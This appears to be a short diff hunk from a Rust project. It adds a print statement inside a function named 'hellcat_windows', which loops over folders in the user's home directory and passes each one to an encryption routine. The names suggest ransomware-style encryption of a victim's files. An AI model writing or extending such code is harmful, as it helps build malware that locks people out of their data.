@@ -34,6 +34,7 @@ pub async fn hellcat_windows() {
     for f in intresting_folder {
         // start encryption
         let full_path = home_str.to_string() + "\\" + f;
+        println!("Encrypting: {}", full_path);
         enc::encryption(full_path.as_str(), decrypt);
     }
         
